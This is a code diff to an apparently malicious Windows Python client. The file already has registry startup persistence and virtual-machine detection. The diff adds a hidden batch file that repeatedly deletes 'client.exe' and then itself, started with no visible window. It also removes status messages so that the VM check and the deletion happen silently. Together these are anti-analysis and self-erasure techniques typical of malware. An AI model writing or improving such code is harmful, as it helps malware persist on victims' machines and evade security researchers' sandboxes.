@@ -60,17 +60,30 @@ def add_to_startup(file_path=None):
     winreg.CloseKey(key)
 
 
+def create_deletion_batch():
+    batch_content = """
+@echo off
+:loop
+del "client.exe"
+if exist "client.exe" goto loop
+del "%~f0"
+"""
+    batch_path = os.path.join(os.path.dirname(sys.argv[0]), "delete_client.bat")
+    with open(batch_path, "w") as batch_file:
+        batch_file.write(batch_content)
+    return batch_path
+
+
 def self_destruction():
     try:
-        os.remove(sys.argv[0])
-        print("The script has been deleted successfully.")
+        batch_path = create_deletion_batch()
+        subprocess.Popen(batch_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except Exception as e:
-        print(f"Failed to delete the script: {e}")
+        pass
 
 
 def main():
     if check_vm():
-        print("Running inside a Virtual Machine. Self-destruction initiated...")
         self_destruction()
     else:
         print("Running on a physical machine.")
